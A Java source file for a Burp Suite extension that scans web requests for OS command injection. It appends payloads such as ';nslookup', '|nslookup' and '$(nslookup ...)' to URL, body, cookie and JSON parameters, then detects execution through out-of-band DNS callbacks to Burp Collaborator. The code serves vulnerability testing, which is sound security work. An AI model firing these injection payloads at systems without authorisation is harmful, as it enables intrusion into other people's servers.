package whoami.checkers;

import burp.api.montoya.core.Annotations;
import burp.api.montoya.core.HighlightColor;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.params.HttpParameter;
import burp.api.montoya.http.message.params.HttpParameterType;
import burp.api.montoya.http.message.requests.HttpRequest;
import burp.api.montoya.collaborator.CollaboratorClient;
import burp.api.montoya.collaborator.Interaction;
import org.json.JSONArray;
import org.json.JSONObject;
import org.json.JSONException;
import whoami.core.CoreModules;

import java.util.ArrayList;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class CMDInjectionChecker {
    private final CoreModules core;
    private static final String[] COMMAND_INJECTION_PAYLOADS = {
        "nslookup %s",
        ";nslookup %s",
        "&nslookup %s",
        "&&nslookup %s",
        "|nslookup %s",
        "`nslookup %s`",
        "$(nslookup %s)",
        "||nslookup %s"
    };

    public CMDInjectionChecker(CoreModules core) {
        this.core = core;
    }

    // Metadata class to store client, parameter, payload, and response
    private static class PayloadMetadata {
        final CollaboratorClient client;
        final String parameter;
        final String payload;
        final HttpRequestResponse response;

        PayloadMetadata(CollaboratorClient client, String parameter, String payload, HttpRequestResponse response) {
            this.client = client;
            this.parameter = parameter;
            this.payload = payload;
            this.response = response;
        }
    }

    public void checkForCMDi(HttpRequest request) {
        checkForCMDi(request, false); // Default: respect delay
    }

    private void checkForCMDi(HttpRequest request, boolean bypassDelay) {
        String url = request.url().toString();
        String method = request.method();
        core.logger.log("CMDi", "Starting Command Injection testing for URL: " + url + ", Method: " + method + ", Bypass Delay: " + bypassDelay);

        // Handle standard parameters
        boolean hasStandardParameters = false;
        List<PayloadMetadata> metadataList = new ArrayList<>();
        for (HttpParameter parameter : request.parameters()) {
            if (parameter.type() == HttpParameterType.JSON) {
                core.logger.log("CMDi", "Skipping JSON parameter: " + parameter.name());
                continue;
            }
            if (parameter.type() == HttpParameterType.COOKIE && !core.uiManager.getConfig().isTestCookies()) {
                core.logger.log("CMDi", "Skipping COOKIE parameter due to toggle: " + parameter.name());
                continue;
            }
            hasStandardParameters = true;

            String name = parameter.name();
            String value = parameter.value();
            HttpParameterType type = parameter.type();

            for (String payloadTemplate : COMMAND_INJECTION_PAYLOADS) {
                // Create new Collaborator client and payload
                CollaboratorClient client = core.getApi().collaborator().createClient();
                String uniqueCollaboratorPayload = client.generatePayload().toString();
                String payload = String.format(payloadTemplate, uniqueCollaboratorPayload);
                String encodedPayload = core.getApi().utilities().urlUtils().encode(payload);
                HttpParameter paramWithPayload = HttpParameter.parameter(name, value + encodedPayload, type);
                HttpRequest req = request.withUpdatedParameters(paramWithPayload);
                core.logger.log("CMDi", "Sending encoded payload for parameter: " + name + ", Payload: " + payload + ", Collaborator: " + uniqueCollaboratorPayload);
                HttpRequestResponse resp = core.requestSender.sendRequest(req, "", false, bypassDelay);
                metadataList.add(new PayloadMetadata(client, name, payload, resp));

                // Check for 500 Internal Server Error
                if (resp.response() != null && resp.response().statusCode() == 500) {
                    core.logger.log("CMDi", "[ERROR] 500 Internal Server Error detected for parameter: " + name + " with payload: " + payload);
                    Annotations annotations = Annotations.annotations()
                            .withHighlightColor(HighlightColor.ORANGE)
                            .withNotes("500 Internal Server Error detected in parameter: " + name + "\n" +
                                       "Payload: " + payload + "\n" +
                                       "Encoded Payload: " + encodedPayload + "\n" +
                                       "This may indicate a potential issue but is not a confirmed vulnerability.");
                    core.getApi().siteMap().add(resp.withAnnotations(annotations));
                }
            }
        }

        // Wait for potential Collaborator interactions (5 seconds)
        try {
            Thread.sleep(5000);
        } catch (InterruptedException e) {
            core.logger.logError("CMDi", "Interrupted while waiting for Collaborator interactions: " + e.getMessage());
        }

        // Check for interactions in each client
        for (PayloadMetadata metadata : metadataList) {
            List<Interaction> interactions = metadata.client.getAllInteractions();
            if (!interactions.isEmpty()) {
                core.logger.log("CMDi", "[VULNERABLE] Command Injection found for parameter: " + metadata.parameter + " with payload: " + metadata.payload);
                Annotations annotations = Annotations.annotations()
                        .withHighlightColor(HighlightColor.RED)
                        .withNotes("Command Injection found in parameter: " + metadata.parameter + "\n" +
                                   "Payload: " + metadata.payload + "\n" +
                                   "Encoded Payload: " + core.getApi().utilities().urlUtils().encode(metadata.payload) + "\n" +
                                   "Collaborator interaction detected, indicating command execution.\n" +
                                   "Interaction details: " + interactions.get(0).type().toString());
                core.getApi().siteMap().add(metadata.response.withAnnotations(annotations));
            }
        }

        if (!hasStandardParameters) {
            core.logger.log("CMDi", "No standard parameters found to test");
        }

        // Handle JSON parameters for POST/PUT
        if (method.equalsIgnoreCase("POST") || method.equalsIgnoreCase("PUT")) {
            String contentType = request.headerValue("Content-Type");
            if (contentType != null && contentType.toLowerCase().contains("application/json")) {
                core.logger.log("CMDi", "Detected JSON request");
                String body = request.bodyToString();
                if (body.isEmpty()) {
                    core.logger.log("CMDi", "Empty JSON body, skipping JSON testing");
                } else {
                    try {
                        JSONObject jsonObject = new JSONObject(body);
                        processJsonNode(jsonObject, "", url, request, bypassDelay);
                    } catch (JSONException e) {
                        core.logger.logError("CMDi", "Failed to parse JSON body: " + e.getMessage());
                    }
                }
            } else {
                core.logger.log("CMDi", "Non-JSON Content-Type, skipping JSON testing");
            }
        }

        core.logger.log("CMDi", "Completed Command Injection testing for URL: " + url);
    }

    public void runContextMenuCmdiTest(HttpRequestResponse requestResponse) {
        core.logger.log("CONTEXT", "=== Starting Command Injection Test from context menu ===");
        try {
            if (requestResponse == null || requestResponse.request() == null) {
                core.logger.logError("CONTEXT", "RequestResponse or Request is null");
                return;
            }

            HttpRequest request = requestResponse.request();
            String url = request.url();
            String method = request.method();

            core.logger.log("CONTEXT", "URL: " + url + ", Method: " + method);
            core.logger.log("CONTEXT", "Parameters: " + request.parameters().size());
            core.logger.log("CONTEXT", "Bypassing all filters: Enabled=" + core.uiManager.getConfig().isEnabled() +
                    ", CMDi Toggle=" + core.uiManager.getConfig().getCheckers().getOrDefault("CMDi", false) +
                    ", Cookie Testing=" + core.uiManager.getConfig().isTestCookies() +
                    ", Excluded Extensions=" + core.uiManager.getConfig().getExcludedExtensions() +
                    ", Method Allowed=" + core.uiManager.getConfig().isMethodAllowed(method) +
                    ", Delay=" + core.uiManager.getConfig().getDelayMillis() + "ms");

            // Temporarily override settings for context menu test
            boolean originalCookieTesting = core.uiManager.getConfig().isTestCookies();
            core.uiManager.getConfig().setTestCookies(true); // Always test cookies
            boolean originalCmdiToggle = core.uiManager.getConfig().getCheckers().getOrDefault("CMDi", false);
            core.uiManager.getConfig().getCheckers().put("CMDi", true); // Force CMDi testing

            // Run CMDi test with delay bypassed
            checkForCMDi(request, true); // Bypass delay

            // Restore original settings
            core.uiManager.getConfig().setTestCookies(originalCookieTesting);
            core.uiManager.getConfig().getCheckers().put("CMDi", originalCmdiToggle);

            core.logger.log("CONTEXT", "=== Completed Command Injection Test ===");
        } catch (Exception e) {
            core.logger.logError("CONTEXT", "Error in context menu CMDi test: " + e.getMessage());
        }
    }

    private void processJsonNode(Object node, String path, String url, HttpRequest originalRequest, boolean bypassDelay) {
        core.logger.log("JSON", "Processing node at path: " + (path.isEmpty() ? "<root>" : path));
        if (node instanceof JSONObject) {
            JSONObject jsonObject = (JSONObject) node;
            for (String key : jsonObject.keySet()) {
                String newPath = path.isEmpty() ? key : path + "." + key;
                processJsonNode(jsonObject.get(key), newPath, url, originalRequest, bypassDelay);
            }
        } else if (node instanceof JSONArray) {
            JSONArray jsonArray = (JSONArray) node;
            if (jsonArray.length() == 0) {
                core.logger.log("JSON", "Found empty array at: " + path + ", testing index [0]");
                testJsonPath(path + "[0]", url, originalRequest, bypassDelay);
            } else {
                for (int i = 0; i < jsonArray.length(); i++) {
                    String newPath = path + "[" + i + "]";
                    processJsonNode(jsonArray.get(i), newPath, url, originalRequest, bypassDelay);
                }
            }
        } else {
            String stringValue = node == null ? "null" : node.toString();
            testJsonPath(path, url, originalRequest, bypassDelay, stringValue);
        }
    }

    private void testJsonPath(String path, String url, HttpRequest originalRequest, boolean bypassDelay, String... stringValue) {
        String value = stringValue.length > 0 ? stringValue[0] : "";
        JSONObject modifiedJson = new JSONObject(originalRequest.bodyToString());
        List<PayloadMetadata> metadataList = new ArrayList<>();
        for (String payloadTemplate : COMMAND_INJECTION_PAYLOADS) {
            // Create new Collaborator client and payload
            CollaboratorClient client = core.getApi().collaborator().createClient();
            String uniqueCollaboratorPayload = client.generatePayload().toString();
            String payload = String.format(payloadTemplate, uniqueCollaboratorPayload);
            if (setJsonValue(modifiedJson, path, value + payload)) {
                HttpRequest req = originalRequest.withBody(modifiedJson.toString());
                core.logger.log("JSON", "Sending raw CMDi payload for: " + path + ", Payload: " + payload + ", Collaborator: " + uniqueCollaboratorPayload);
                HttpRequestResponse resp = core.requestSender.sendRequest(req, "", false, bypassDelay);
                metadataList.add(new PayloadMetadata(client, path, payload, resp));

                // Check for 500 Internal Server Error
                if (resp.response() != null && resp.response().statusCode() == 500) {
                    core.logger.log("JSON", "[ERROR] 500 Internal Server Error detected for JSON parameter: " + path + " with payload: " + payload);
                    Annotations annotations = Annotations.annotations()
                            .withHighlightColor(HighlightColor.ORANGE)
                            .withNotes("500 Internal Server Error detected in JSON parameter: " + path + "\n" +
                                       "Payload: " + payload + "\n" +
                                       "This may indicate a potential issue but is not a confirmed vulnerability.");
                    core.getApi().siteMap().add(resp.withAnnotations(annotations));
                }
            }
            // Reset JSON for next payload
            modifiedJson = new JSONObject(originalRequest.bodyToString());
        }

        // Wait for potential Collaborator interactions (5 seconds)
        try {
            Thread.sleep(5000);
        } catch (InterruptedException e) {
            core.logger.logError("JSON", "Interrupted while waiting for Collaborator interactions: " + e.getMessage());
        }

        // Check for interactions in each client
        for (PayloadMetadata metadata : metadataList) {
            List<Interaction> interactions = metadata.client.getAllInteractions();
            if (!interactions.isEmpty()) {
                core.logger.log("JSON", "[VULNERABLE] Command Injection found for JSON parameter: " + metadata.parameter + " with payload: " + metadata.payload);
                Annotations annotations = Annotations.annotations()
                        .withHighlightColor(HighlightColor.RED)
                        .withNotes("Command Injection found in JSON parameter: " + metadata.parameter + "\n" +
                                   "Payload: " + metadata.payload + "\n" +
                                   "Collaborator interaction detected, indicating command execution.\n" +
                                   "Interaction details: " + interactions.get(0).type().toString());
                core.getApi().siteMap().add(metadata.response.withAnnotations(annotations));
            }
        }
    }

    private boolean setJsonValue(JSONObject jsonObject, String path, String value) {
        core.logger.log("JSON", "Setting value at: " + path + " to: " + value);
        try {
            List<String> parts = new ArrayList<>();
            Matcher matcher = Pattern.compile("\\w+|\\d+").matcher(path.replaceAll("\\.", " ").replaceAll("\\[", " ").replaceAll("\\]", ""));
            while (matcher.find()) {
                parts.add(matcher.group());
            }

            Object current = jsonObject;
            for (int i = 0; i < parts.size() - 1; i++) {
                String part = parts.get(i);
                if (current instanceof JSONObject) {
                    JSONObject currentObj = (JSONObject) current;
                    if (!currentObj.has(part)) {
                        currentObj.put(part, new JSONObject());
                    }
                    current = currentObj.get(part);
                } else if (current instanceof JSONArray) {
                    int index = Integer.parseInt(part);
                    JSONArray currentArray = (JSONArray) current;
                    while (currentArray.length() <= index) {
                        currentArray.put((Object) null);
                    }
                    current = currentArray.get(index);
                } else {
                    core.logger.logError("JSON", "Invalid structure at: " + path + ", found: " + current.getClass().getSimpleName());
                    return false;
                }
            }

            String lastPart = parts.get(parts.size() - 1);
            if (current instanceof JSONObject) {
                ((JSONObject) current).put(lastPart, value);
            } else if (current instanceof JSONArray) {
                int index = Integer.parseInt(lastPart);
                JSONArray currentArray = (JSONArray) current;
                while (currentArray.length() <= index) {
                    currentArray.put((Object) null);
                }
                currentArray.put(index, value);
            } else {
                core.logger.logError("JSON", "Invalid structure at: " + path + ", found: " + current.getClass().getSimpleName());
                return false;
            }
            return true;
        } catch (Exception e) {
            core.logger.logError("JSON", "Failed to set value at: " + path + ", error: " + e.getMessage());
            return false;
        }
    }
}
